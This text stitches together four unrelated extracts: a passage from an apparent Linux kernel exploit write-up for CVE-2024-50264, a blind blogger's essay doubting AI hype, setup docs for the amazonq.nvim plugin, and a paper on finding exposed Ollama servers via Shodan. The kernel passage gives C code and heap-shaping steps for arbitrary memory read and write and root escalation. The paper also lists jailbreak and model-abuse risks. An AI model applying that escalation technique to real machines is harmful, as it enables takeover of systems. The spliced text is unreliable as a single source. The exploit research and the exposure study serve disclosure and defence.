    &lt;p&gt;In that case, the memory object overlapping looked like this: four &lt;code&gt;pipe_buffer&lt;/code&gt; objects in one &lt;code&gt;kmalloc-192&lt;/code&gt; slab are allocated at the place of two &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects in two &lt;code&gt;kmalloc-96&lt;/code&gt; slabs. The following diagram illustrates the overlap:&lt;/p&gt;
    &lt;p&gt;Here, memory corruption can land on either of the two &lt;code&gt;virtio_vsock_sock&lt;/code&gt; objects. I'll cover these cases one at a time.&lt;/p&gt;
    &lt;p&gt;To avoid the kernel hang and crash when the UAF hits &lt;code&gt;virtio_vsock_sock&lt;/code&gt; #1, I used two tricks:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Performed a &lt;code&gt;splice()&lt;/code&gt;from a regular file to the pipe with a starting offset of zero. As mentioned earlier, this keeps the&lt;code&gt;offset&lt;/code&gt;field of the first&lt;code&gt;pipe_buffer&lt;/code&gt;at zero, so the kworker doesn't hang while acquiring the spinlock.&lt;/item&gt;
      &lt;item&gt;Discarded that first &lt;code&gt;pipe_buffer&lt;/code&gt;before triggering the UAF, leaving its&lt;code&gt;offset&lt;/code&gt;field untouched:&lt;code&gt;/* Remove the first pipe_buffer without changing the `pipe_buffer.offset` */ bytes = splice(pipe_fd[0], NULL, temp_pipe_fd[1], NULL, 1, 0); if (bytes &amp;lt; 0) err_exit("[-] splice"); if (bytes == 0) err_exit("[-] splice short"); /* * Let's read this byte and empty the first pipe_buffer. * So if the UAF writing corrupts the first pipe_buffer, * that will not crash the kernel. Cool! */ bytes = read(temp_pipe_fd[0], pipe_data_to_read, 1); /* 1 spliced byte */ if (bytes &amp;lt; 0) err_exit("[-] pipe read 1"); if (bytes != 1) err_exit("[-] pipe read 1 short");&lt;/code&gt;&lt;p&gt;After this sequence of&lt;/p&gt;&lt;code&gt;splice()&lt;/code&gt;and&lt;code&gt;read()&lt;/code&gt;, the first&lt;code&gt;pipe_buffer&lt;/code&gt;becomes inactive. Even if the subsequent UAF overwrites its&lt;code&gt;ops&lt;/code&gt;pointer, later pipe operations won't dereference that corrupted pointer, so no kernel crash occurs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I wanted to exploit the UAF on &lt;code&gt;virtio_vsock_sock&lt;/code&gt; #2 to overwrite the fourth &lt;code&gt;pipe_buffer&lt;/code&gt;. To prevent the kernel hang when the UAF hits this second &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, I called the same &lt;code&gt;splice(temp_file_fd, &amp;amp;file_offset, pipe_fd[1], NULL, 1, 0)&lt;/code&gt; two more times. These syscalls initialized the second and third &lt;code&gt;pipe_buffer&lt;/code&gt; objects, leaving their &lt;code&gt;flags&lt;/code&gt; at zero, since this pipe operation doesn't set any &lt;code&gt;PIPE_BUF_FLAG_*&lt;/code&gt; bits. Therefore, if the UAF occurs on the second &lt;code&gt;virtio_vsock_sock&lt;/code&gt;, the &lt;code&gt;spin_lock_bh()&lt;/code&gt; in &lt;code&gt;virtio_transport_space_update()&lt;/code&gt; will not hang.&lt;/p&gt;
    &lt;p&gt;These preparations of the pipe opened a door for corrupting the &lt;code&gt;page&lt;/code&gt; pointer of the fourth &lt;code&gt;pipe_buffer&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;kernel-hack-drill&lt;/code&gt; let me experiment with &lt;code&gt;pipe_buffer&lt;/code&gt; objects. Without it, crafting this exploit primitive for the tricky CVE-2024-50264 would have been extremely hard.&lt;/p&gt;
    &lt;head rend="h2"&gt;AARW and KASLR's last revenge&lt;/head&gt;
    &lt;p&gt;In a &lt;code&gt;pipe_buffer&lt;/code&gt;, the &lt;code&gt;page&lt;/code&gt; pointer holds the address of a &lt;code&gt;struct page&lt;/code&gt; inside the virtual memory map (&lt;code&gt;vmemmap&lt;/code&gt;). &lt;code&gt;vmemmap&lt;/code&gt; is an array of these structures that allows the kernel to address physical memory efficiently. It is mentioned in &lt;code&gt;Documentation/arch/x86/x86_64/mm.rst&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;____________________________________________________________|___________________________________________________________

&lt;/code&gt;
    &lt;p&gt;Hence, when I managed to perform a UAF write of controlled data to the &lt;code&gt;pipe_buffer.page&lt;/code&gt; pointer, I gained arbitrary address reading and writing (AARW) via the pipe. However, I wasn't able to change the AARW target address many times, as I mentioned in Limitation #5, so I had to choose the target in &lt;code&gt;vmemmap&lt;/code&gt; carefully.&lt;/p&gt;
    &lt;p&gt;My first thought was to overwrite part of the kernel code. But with KASLR enabled, I didn't know the physical address of kernel &lt;code&gt;_text&lt;/code&gt; and therefore couldn't determine its location inside &lt;code&gt;vmemmap&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;That's why I decided to use the pipe AARW against &lt;code&gt;struct cred&lt;/code&gt; in the kernel heap. As I described earlier, I leaked the virtual address of &lt;code&gt;cred&lt;/code&gt; using my &lt;code&gt;msg_msg&lt;/code&gt; out-of-bounds read. This virtual address looked like &lt;code&gt;0xffff888003b7ad00&lt;/code&gt;, and I understood it was from the direct mapping of all physical memory. So I used the following formula to calculate the offset of the corresponding &lt;code&gt;struct page&lt;/code&gt; in &lt;code&gt;vmemmap&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;#define STRUCT_PAGE_SZ 64lu
#define PAGE_ADDR_OFFSET(addr) (((addr &amp;amp; 0x3ffffffflu) &amp;gt;&amp;gt; 12) * STRUCT_PAGE_SZ)
uaf_val = PAGE_ADDR_OFFSET(cred_addr);
&lt;/code&gt;
    &lt;p&gt;The idea behind it is simple:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;addr &amp;amp; 0x3ffffffflu&lt;/code&gt;gives the offset of the&lt;code&gt;struct cred&lt;/code&gt;from the&lt;code&gt;page_offset_base&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Right shift by 12 gives the number of the memory page containing &lt;code&gt;struct cred&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Finally, multiplication by 64 (the size of &lt;code&gt;struct page&lt;/code&gt;) gives the offset of the corresponding&lt;code&gt;struct page&lt;/code&gt;in the&lt;code&gt;vmemmap&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This formula should be adapted if the system has more than 4 GiB of RAM. In that case, &lt;code&gt;ZONE_NORMAL&lt;/code&gt; containing kernel allocations usually starts at address &lt;code&gt;0x100000000&lt;/code&gt;. Hence, to calculate the offset of the needed &lt;code&gt;struct page&lt;/code&gt;, we should add &lt;code&gt;(0x100000000 &amp;gt;&amp;gt; 12) * STRUCT_PAGE_SZ&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Excellent, the described formula is independent of KASLR for physical addresses, so I could use it to calculate the four lower bytes of the target address for exploiting the pipe AARW against the &lt;code&gt;struct cred&lt;/code&gt;. Why I needed only four lower bytes of &lt;code&gt;pipe_buffer.page&lt;/code&gt;:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;My UAF write to &lt;code&gt;peer_buf_alloc&lt;/code&gt;performed partial overwriting of the first half of the&lt;code&gt;pipe_buffer.page&lt;/code&gt;pointer, as I showed at the diagram above.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;x86_64&lt;/code&gt;is little-endian, so the first half of the pointer contains four lower bytes of the address.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;But when I tried this approach, KASLR carried out its last revenge. It randomized the &lt;code&gt;vmemmap_base&lt;/code&gt; address, and the four lower bytes of the &lt;code&gt;struct page&lt;/code&gt; pointers carried two random bits. Ouch!&lt;/p&gt;
    &lt;p&gt;However, I decided to brute-force those two bits because I could achieve the UAF write around 5 times before the kworker got a null-ptr-deref after &lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt; (8 sec).&lt;/p&gt;
    &lt;p&gt;I found that probing different values of &lt;code&gt;pipe_buffer.page&lt;/code&gt; from userspace works perfectly well:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;In case of fail, reading from the pipe simply returns &lt;code&gt;Bad address&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;In case of success, reading from the pipe gives &lt;code&gt;struct cred&lt;/code&gt;contents.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Great! I could finally determine a proper AARW target address, write to the pipe, overwrite euid and egid with 0, and get root. See the PoC exploit demo:&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Bug collisions are painful. Finishing the research anyway is rewarding. Let me quote my good friend:&lt;/p&gt;
    &lt;p&gt;Working on this hard race condition with multiple limitations allowed me to discover new exploitation techniques and to use and improve my pet project kernel-hack-drill, which provides a testing environment for Linux kernel security researchers. You are welcome to try it and contribute.&lt;/p&gt;
    &lt;p&gt;Thanks for reading!&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;As I was looking at the amount of times platforms died on the web and I began thinking about the slow death of AI enthusiasm and what that will do to the Blind community.&lt;/p&gt;
    &lt;p&gt;It really is a bizarre feeling when you’re the only skeptic of a thing within your own community. My first post about AI has gained some attention, as well as the follow up post about this topic. AI is taking the blind community by storm. Be my Eyes has added it into their product to describe pictures, Let’s not mention the fact the particular large language model, LLM called Chat GPT they chose, was never the right kind of machine learning for the task of describing images. A different kind of machine learning would have been better. Blind podcasters are praising LLMs and saying they’re more accurate than human descriptions, and, well, blind voiceover artists are more than willing to give places like ElevenLabs their voices so they can, well, I don’t even know yet. I guess attempt to make audiobooks.&lt;/p&gt;
    &lt;p&gt;I’m of two minds about this whole thing. While the stuff LLMs is giving us is incorrect information, it’s still information that the sighted world won’t or refuses to give us. While I absolutely hate the hype and even AI nonsense in general, and don’t use any LLM on any of my content, blind and visually impaired people can become audio book narrators if their Braille skills aren’t that great with ElevenLabs.&lt;/p&gt;
    &lt;p&gt;Even though I’ll never hire a blind narrator that uses ElevenLabs to generate an audio book, am I practicing discrimination by doing this? Someone will say yes. I don’t know what will come of this wave in LLMs and dependance on AI, but I predict that once the hype dies down, well, blind and even legally blind people are probably going to be advocating for more accessibility measures but in a different way.&lt;/p&gt;
    &lt;p&gt;AI accessibility will have its own challenges. In fact, we’re already witnessing instances of AI developers forgetting disabled people exist so I fully predict that blind people will be advocating to make actual LLM platforms accessible. While that’s a fight that won’t happen for a while, I also predict that the actual text output of some of these generators will be inaccessible, prompting another push to make these interfaces usable by everyone. I also predict web accessibility will actually get worse, not better, as coding models will spit out inaccessible code that developers won’t check or won’t even care to check. But I’m the only one within the community that’s unenthusiastic about the benefits of AI within our community.&lt;/p&gt;
    &lt;p&gt;I’m old enough to remember when OCR became a huge hit to play video games, scan inaccessible documents, and otherwise. While I also use OCR for speed and efficiency, or just even to get halfway there, I still use a human to read stuff because, even today, OCR isn’t where I thought it was going to be. Same for self-driving cars. Now that AI is a thing now, I doubt OCR and even self-driving cars will get any significant advancements.&lt;/p&gt;
    &lt;p&gt;About usage, well, that’s what blind people are using LLMs for at this very moment. They’re using it to describe characters from TV shows and movies in great detail. they’re using it to describe music videos, but to the blind and visually impaired people that use these tools, they aren’t so much caring about the accuracy of the information. It’s information they’ve never had previously. Accuracy is an afterthought. The only thing that matters is having information that they never had previously. Then again, these are the very same blind and visually impaired people that say that the Social model of Disability is woke PC nonsense, so it’s no surprise that the community as a whole would jump on the LLM hype. The blind and visually impaired people advocating for this have been conditioned to believe that technology will solve all accessibility problems because, simply put, humans won’t do it. Humans won’t care. Humans are inefficient squishy things that live in a completely different, subjective, world. Blind and visually impaired people don’t want to wade through a subjective landscape. Objectivity matters to our community, no matter the cost of accuracy.&lt;/p&gt;
    &lt;p&gt;Another reason the Blind community is enthusiastic about AI is simply because, to other blind people, it makes them feel like less of a burden on society and vastly more independent. With an LLM, it will never get annoyed, aggravated, think less of the person, or similar. Humans have been conditioned to think we are useless because we are blind so any help we ask for is viewed as a job or a chore rather than a chance to make someone’s life easier.&lt;/p&gt;
    &lt;p&gt;Also, most blind people don’t have a sighted person around because sighted people never willingly talk to a blind person just because. An LLM will always be there, well, until the servers go down, but this isn’t even a concern yet within the community and I don’t think it will be a thought until an AI server goes down the same way bionic eye servers shut down.&lt;/p&gt;
    &lt;p&gt;Even though I don’t use AI or LLMs and even though I do have in person and remote friends I can get assistance from without feeling as if I’m wasting their life, I’m also thinking about how our community has just replaced being dependent on humans with being dependent on tech and technology. I wonder, though, what will be the next technology thing our community clings to because humans fail us again, and again, and again, and again. Humans still continuously actually say no to accessibility when designing websites, so it’s also no wonder why some blind and visually impaired people are championing AI accessibility toolbars like AccessiBe. The web is inaccessible, and, with every refusal of our basic access needs, it’s no wonder the community has given up on humans and dove headfirst into putting faith in another algorithm.&lt;/p&gt;
    &lt;p&gt;My stance is very unique within the community. Have I used these tools to describe a picture when no human was around? Of course. I’ve used it to describe memes now that the Say my Meme podcast appears to have stopped updating. I’ve used it to get a starting point on pictures. It’s the same with OCR. Even though I’ve used these tools, I just don’t think they are even worth half the hype. In fact, even today, there are incidences happening where AI is starting to look like Web3 hype nonsense. The Facebook thing got rid of their responsible AI team, search engines are useless because AI junk is flooding results now, small search engines are becoming very popular, indicating people are tired of this new wave of content. OpenAI can’t decide if it wants to fire people or bring them back because of ethics over growth, and Tech billionaires keep strategizing to make even more money off their own hype.&lt;/p&gt;
    &lt;p&gt;There are many more examples of AI going very wrong and basically even making people very angry that big tech is stealing their labor, but I’ll leave you with the best podcast to debunk all the AI hype and nonsense. Well, okay, two podcasts. Tech Won’t Save Us, which is basically a podcast that detests tech and tech culture in general, and my personal favorite, Mystery AI Hype Theater 3000, a podcast that debunks all the AI hype.&lt;/p&gt;
    &lt;p&gt;Meanwhile, I’ll be reading personal blogs and the small web because the indieweb is cozy and because personal websites won’t die as often nor as quickly as the rest of the web. Tootles!&lt;/p&gt;
  &lt;/main&gt;

    &lt;/list&gt;
    &lt;p&gt;Configure authentication by setting the &lt;code&gt;ssoStartUrl&lt;/code&gt; value in your setup:&lt;/p&gt;
    &lt;code&gt;require('amazonq').setup({
  ssoStartUrl = 'https://view.awsapps.com/start', -- For Free Tier with AWS Builder ID
  -- OR
  -- ssoStartUrl = 'your-organization-sso-url', -- For Pro subscription
})&lt;/code&gt;
    &lt;p&gt;The plugin provides a single global &lt;code&gt;:AmazonQ&lt;/code&gt; command and &lt;code&gt;zq&lt;/code&gt; mapping:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Command/Mapping&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:AmazonQ&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Open Amazon Q chat window&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;zq&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Select text, then type &lt;code&gt;zq&lt;/code&gt; to append it to the chat context. Equivalent to: select text, type &lt;code&gt;:AmazonQ&lt;/code&gt;, then run the command.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:AmazonQ refactor&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Select code, then run this to get refactoring suggestions&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;:.AmazonQ fix&lt;/code&gt;
        &lt;/cell&gt;

    &lt;p&gt;Amazon Q provides AI-powered code suggestions as you type. These are implemented through the LSP &lt;code&gt;textDocument/completion&lt;/code&gt; method and work with most Neovim completion plugins (nvim-cmp, blink, mini.completion, etc.).&lt;/p&gt;
    &lt;p&gt;To use inline suggestions:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Authenticate with &lt;code&gt;:AmazonQ login&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Start typing in a supported filetype&lt;/item&gt;
      &lt;item&gt;Trigger completion using your completion plugin's keybinding&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Inline suggestions are enabled by default. To disable them:&lt;/p&gt;

    &lt;p&gt;To develop this plugin, you probably want to add it to the Nvim &lt;code&gt;'runtimepath'&lt;/code&gt; so that you can test your changes easily. In that case, remove it from your plugin manager config.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Clone amazonq.nvim package locally:&lt;/p&gt;
        &lt;code&gt;git clone git@github.com:awslabs/amazonq.nvim.git&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Remove amazonq.nvim from your plugin manager config, if necessary.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Add the amazonq.nvim package to the Nvim&lt;/p&gt;&lt;code&gt;'runtimepath'&lt;/code&gt;. This tells Nvim to look for plugins at that path.&lt;quote&gt;vim.cmd[[set runtimepath+=/path/to/amazonq.nvim]]&lt;/quote&gt;&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;You can now use the&lt;/p&gt;&lt;code&gt;amazonq&lt;/code&gt;plugin located in the amazonq.nvim package path. You can make edits, restart Nvim to test them, open Pull Requests, etc.&lt;quote&gt;require('amazonq').setup({ ssoStartUrl = 'https://view.awsapps.com/start', debug = true, -- Enable debug mode during development })&lt;/quote&gt;&lt;/item&gt;

    &lt;p&gt;The rapid deployment of large language models (LLMs) has introduced significant security vulnerabilities due to misconfigurations and inadequate access controls. This paper presents a systematic approach to identifying publicly exposed LLM servers, focusing on instances running the Ollama framework. Utilizing Shodan, a search engine for internet-connected devices, we developed a Python-based tool to detect unsecured LLM endpoints. Our study uncovered over 1,100 exposed Ollama servers, with approximately 20% actively hosting models susceptible to unauthorized access. These findings highlight the urgent need for security baselines in LLM deployments and provide a practical foundation for future research into LLM threat surface monitoring.&lt;/p&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;The integration of large language models (LLMs) into diverse applications has surged in recent years, driven by their advanced capabilities in natural language understanding and generation. Widely adopted platforms such as ChatGPT, Grok, and DeepSeek have contributed to the mainstream visibility of LLMs, while open-source frameworks like Ollama and Hugging Face have significantly lowered the barrier to entry for deploying these models in custom environments. This has led to widespread adoption by both organizations and individuals of a broad range of tasks, including content generation, customer support, data analysis, and software development.&lt;/p&gt;
    &lt;p&gt;Despite their growing utility, the pace of LLM adoption has often outstripped the development and implementation of appropriate security practices. Many self-hosted or locally deployed LLM solutions are brought online without adequate hardening, frequently exposing endpoints due to default configurations, weak or absent authentication, and insufficient network isolation. These vulnerabilities are not only a byproduct of poor deployment hygiene but are also symptomatic of an ecosystem that has largely prioritized accessibility and performance over security. As a result, improperly secured LLM instances present an expanding attack surface, opening the door to risks such as:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Unauthorized API Access — Many ML servers operate without authentication, allowing anyone to submit queries.&lt;/item&gt;
      &lt;item&gt;Model Extraction Attacks — Attackers can reconstruct model parameters by querying an exposed ML server repeatedly.&lt;/item&gt;
      &lt;item&gt;Jailbreaking and Content Abuse — LLMs like GPT-4, LLaMA, and Mistral can by manipulated to generate restricted content, including misinformation, malware code, or harmful outputs.&lt;/item&gt;
      &lt;item&gt;Resource Hijacking (ML DoS Attacks) — Open AI models can be exploited for free computation, leading to excessive costs for the host.&lt;/item&gt;
      &lt;item&gt;Backdoor Injection and Model Poisoning — Adversaries could exploit unsecured model endpoints to introduce malicious payloads or load untrusted models remotely.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This work investigates the prevalence and security posture of publicly accessible LLM servers, with a focus on instances utilizing the Ollama framework, which has gained popularity for its ease of use and local deployment capabilities. While Ollama enables flexible experimentation and local model execution, its deployment defaults and documentation do not explicitly emphasize security best practices, making it a compelling target for analysis.&lt;/p&gt;
    &lt;p&gt;To assess the real-world implications of these concerns, we leverage the Shodan search engine to identify exposed Ollama servers and evaluate their security configurations. Our investigation is guided by three primary contributions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Development of a proof-of-concept tool, written in Python, to detect exposed Ollama servers through Shodan queries&lt;/item&gt;
      &lt;item&gt;Analysis of identified instances evaluate authentication enforcement, endpoint exposure, and model accessibility&lt;/item&gt;
      &lt;item&gt;Recommendations for mitigating common vulnerabilities in LLM deployments, with a focus on practical security improvements&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Our findings reveal that a significant number of organizations and individuals expose their LLM infrastructure to the internet, often without realizing the implications. This creates avenues for misuse, ranging from resource exploitation to malicious prompt injection and data inference.&lt;/p&gt;
    &lt;head rend="h2"&gt;Methodology&lt;/head&gt;
    &lt;p&gt;The proposed system utilizes Shodan, a search engine that indexes internet-connected devices, to identify potentially vulnerable AI inference servers. This approach was selected with privacy and ethical considerations in mind, specifically to avoid the risks associated with directly scanning remote systems that may already be exposed or improperly secured. By relying on Shodan’s existing database of indexed endpoints, the system circumvents the need for active probing, thereby reducing the likelihood of triggering intrusion detection systems or violating acceptable use policies.&lt;/p&gt;
    &lt;p&gt;In addition to being more ethical, leveraging Shodan also provides a scalable and efficient mechanism for identifying LLM deployments accessible over the public internet. Manual enumeration or brute-force scanning of IP address ranges would be significantly more resource-intensive and potentially problematic from both legal and operational perspectives.&lt;/p&gt;
    &lt;p&gt;The system operates in two sequential stages. In the first stage, Shodan is queried to identify publicly accessible Ollama servers based on distinctive network signatures or banners. In the second stage, each identified endpoint is programmatically queried to assess its security posture, with a particular focus on authentication and authorization mechanisms. This includes evaluating whether endpoints require credentials, enforce access control, or expose model metadata and functionality without restriction.&lt;/p&gt;
    &lt;p&gt;An overview of the system architecture is illustrated in Figure 1, which outlines the workflow from endpoint discovery to vulnerability analysis.&lt;/p&gt;
    &lt;head rend="h2"&gt;Detecting Exposed Ollama Servers&lt;/head&gt;
    &lt;p&gt;Our approach focuses on identifying deployments of popular LLM hosting tools by scanning for default ports and service banners associated with each implementation. Below we provide a list of LLM platforms examined and their associated default ports, which are used as heuristics for identification:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Ollama / Mistral / LLaMA models — Port 11434&lt;/item&gt;
      &lt;item&gt;vLLM — Port 8000&lt;/item&gt;
      &lt;item&gt;llama.cpp — Ports 8000, 8080&lt;/item&gt;
      &lt;item&gt;LM Studio — Port 1234&lt;/item&gt;
      &lt;item&gt;GPT4All — Port 4891&lt;/item&gt;
      &lt;item&gt;LangChain — Port 8000&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Using the Shodan API, the system retrieves metadata for hosts operating on these ports, including IP addresses, open ports, HTTP headers, and service banners. To minimize false positives, such as unrelated applications using the same ports, the developed system performs an additional filtering step based on banner content. For example, Ollama instances are verified using keyword matching against the service banner (e.g., port:11434 “Ollama”), which increases confidence that the endpoint is associated with the targeted LLM tooling rather than an unrelated application using the same port.&lt;/p&gt;
    &lt;p&gt;During analysis, we identified an additional signature that enhanced the accuracy of fingerprinting Ollama deployments. Specifically, a significant proportion of the discovered Ollama instances were found to be running the Uvicorn ASGI server, a lightweight, Python-based web server commonly employed for serving asynchronous APIs. In such cases, the HTTP response headers included the field Server: “uvicorn”, which functioned as a valuable secondary indicator, particularly when the service banner lacked an explicit reference to the Ollama platform. Conversely, our research also indicates that servers running Uvicorn are more likely to host LLM applications as this Python-based web server appears to be popular among software used for self-hosting LLMs.&lt;/p&gt;
    &lt;p&gt;This observation strengthens the resilience of our detection methodology by enabling the inference of Ollama deployments even in the absence of direct product identifiers. Given Uvicorn’s widespread use in Python-based microservice architectures and AI inference backends, its presence, especially when correlated with known Ollama-specific ports (e.g., 11434) substantially increases the confidence level that a host is serving an LLM-related application. A layered fingerprinting approach improves the precision of our system and reduces reliance on single-point identifiers that may be obfuscated or omitted.&lt;/p&gt;
    &lt;p&gt;The banner-based fingerprinting method draws from established principles in network reconnaissance and is a widely accepted approach in both academic research and penetration testing contexts. According to prior work in internet-wide scanning, service banners and default ports provide a reliable mechanism for characterizing software deployments at scale, albeit with limitations in environments employing obfuscation or non-standard configurations.&lt;/p&gt;
    &lt;p&gt;By combining port-based filtering with banner analysis and keyword validation, our system aims to strike a balance between recall and precision in identifying genuinely exposed LLM servers, thus enabling accurate and responsible vulnerability assessment.&lt;/p&gt;
    &lt;head rend="h2"&gt;Authorization and Authentication Assessment&lt;/head&gt;
    &lt;p&gt;Once a potentially vulnerable Ollama server is identified, we initiate a series of automated API queries to determine whether access controls are in place and whether the server responds deterministically to standardized test inputs. This evaluation specifically assesses the presence or absence of authentication enforcement and the model’s responsiveness to benign prompt injections, thereby providing insight into the system’s exposure to unauthorized use. To minimize operational risk and ensure ethical testing standards, we employ a minimal, non-invasive prompt structure as follows:&lt;/p&gt;
    &lt;p&gt;A successful HTTP 200 response accompanied by the correct result (e.g., “4”) indicates that the server is accepting and executing prompts without requiring authentication. This represents a high-severity security issue, as it suggests that arbitrary, unauthenticated prompt execution is possible. In such cases, the system is exposed to a broad range of attack vectors, including the deployment and execution of unauthorized models, prompt injection attacks, and the deletion or modification of existing assets.&lt;/p&gt;
    &lt;p&gt;Moreover, unprotected endpoints may be subjected to automated fuzzing or adversarial testing using tools such as Promptfoo or Garak, which are designed to probe LLMs for unexpected behavior or latent vulnerabilities. These tools, when directed at unsecured instances, can systematically uncover unsafe model responses, prompt leakage, or unintended completions that may compromise the integrity or confidentiality of the system.&lt;/p&gt;
    &lt;p&gt;Conversely, HTTP status codes 401 (Unauthorized) or 403 (Forbidden) denote that access controls are at least partially enforced, often through default authentication mechanisms. While such configurations do not guarantee full protection, particularly against brute-force or misconfiguration exploits, they substantially reduce the immediate risk of casual or opportunistic exploitation. Nonetheless, even authenticated instances require scrutiny to ensure proper isolation, rate limiting, and audit logging, as part of a comprehensive security posture.&lt;/p&gt;
    &lt;head rend="h2"&gt;Findings&lt;/head&gt;
    &lt;p&gt;The results from our scans confirmed the initial hypothesis: a significant number of Ollama servers are publicly exposed and vulnerable to unauthorized prompt injection. Utilizing an automated scanning tool in conjunction with Shodan, we identified 1,139 vulnerable Ollama instances. Notably, the discovery rate was highest in the initial phase of scanning, with over 1,000 instances detected within the first 10 minutes, highlighting the widespread and largely unmitigated nature of this exposure.&lt;/p&gt;
    &lt;p&gt;Geospatial analysis of the identified servers revealed a concentration of vulnerabilities in several major regions. As depicted in Figure 3, the majority of exposed servers were hosted in the United States (36.6%), followed by China (22.5%) and Germany (8.9%). To protect the integrity and privacy of affected entities, IP addresses have been redacted in all visual documentation of the findings.&lt;/p&gt;
    &lt;p&gt;Out of the 1,139 exposed servers, 214 were found to be actively hosting and responding to requests with live models—accounting for approximately 18.8% of the total scanned population with Mistral and LLaMA representing the most frequently encountered deployments. A review of the least common model names was also conducted, revealing what appeared to be primarily self-trained or otherwise customized LLMs. In some instances, the names alone provided enough information to identify the hosting party. To safeguard their privacy, tha names of these models have been excluded from the findings. These interactions confirm the feasibility of prompt-based interaction without authentication, and thus the risk of exploitation.&lt;/p&gt;
    &lt;p&gt;Conversely, the remaining 80% of detected servers, while reachable via unauthenticated interfaces, did not have any models instantiated. These “dormant” servers, though not actively serving model responses, remain susceptible to exploitation via unauthorized model uploads or configuration manipulation. Importantly, their exposed interfaces could still be leveraged in attacks involving resource exhaustion, denial of service, or lateral movement.&lt;/p&gt;
    &lt;p&gt;An additional observation was the widespread adoption of OpenAI-compatible API schemas across disparate model hosting platforms. Among the discovered endpoints, 88.89% adhered to the standardized route structure used by OpenAI (e.g., v1/chat/completions), enabling simplified interoperability but also creating uniformity that could be exploited by automated attack frameworks. This API-level homogeneity facilitates the rapid development and deployment of malicious tooling capable of interacting with multiple LLM providers with minimal modification.&lt;/p&gt;
    &lt;p&gt;These findings showcase a critical and systemic vulnerability in the deployment of LLM infrastructure. The ease with which these servers can be located, fingerprinted, and interacted with raises urgent concerns regarding operational security, access control defaults, and the potential for widespread misuse in the absence of robust authentication and model access restrictions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Limitations&lt;/head&gt;
    &lt;p&gt;While the proposed system effectively identified a substantial number of exposed Ollama servers, several limitations should be acknowledged that may impact the completeness and accuracy of the results.&lt;/p&gt;
    &lt;p&gt;First, the detection process is inherently limited by Shodan’s scanning coverage and indexing frequency. Only servers already discovered and cataloged by Shodan can be analyzed, meaning any hosts outside its visibility, due to firewalls, opt-out policies, or geographical constraints remain undetected.&lt;/p&gt;
    &lt;p&gt;Secondly, the system relies on Shodan’s fingerprinting accuracy. If Ollama instances are configured with custom headers, reverse proxies, or stripped HTTP metadata, they may not be correctly classified by Shodan, leading to potential false negatives.&lt;/p&gt;
    &lt;p&gt;Third, the approach targets default and commonly used ports (e.g., 11434), which introduces a bias toward standard configurations. Servers running on non-standard or intentionally obfuscated ports are likely to evade detection entirely.&lt;/p&gt;
    &lt;p&gt;Finally, the analysis focuses exclusively on Ollama deployments and does not extend to other LLM hosting frameworks. While this specialization enhances precision within a narrow scope, it limits generalizability across the broader LLM infrastructure landscape.&lt;/p&gt;
    &lt;head rend="h2"&gt;Mitigation Strategies&lt;/head&gt;
    &lt;p&gt;The widespread exposure of unauthenticated Ollama servers highlights the urgent need for standardized, practical, and layered mitigation strategies aimed at securing LLM infrastructure. Below, we propose a set of technical and procedural defenses, grounded in best practices and supported by existing tools and frameworks.&lt;/p&gt;
    &lt;head rend="h3"&gt;Enforce Authentication and Access Control&lt;/head&gt;
